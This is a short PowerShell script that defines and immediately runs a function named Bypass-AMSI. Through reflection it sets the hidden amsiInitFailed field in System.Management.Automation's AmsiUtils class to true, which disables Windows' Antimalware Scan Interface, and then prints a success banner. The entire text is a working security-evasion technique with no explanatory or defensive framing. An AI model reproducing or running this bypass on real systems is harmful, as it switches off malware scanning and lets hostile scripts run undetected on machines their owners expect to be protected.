function Bypass-AMSI {
    $amsi = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
    $type = $amsi.GetType('System.Management.Automation.AmsiUtils')
    $field = $type.GetField('amsiInitFailed', 'NonPublic,Static')
    $field.SetValue($null, $true)
    Write-Host "[+] AMSI Bypass Applied" -ForegroundColor Green
}
# Apply AMSI Bypass
Bypass-AMSI
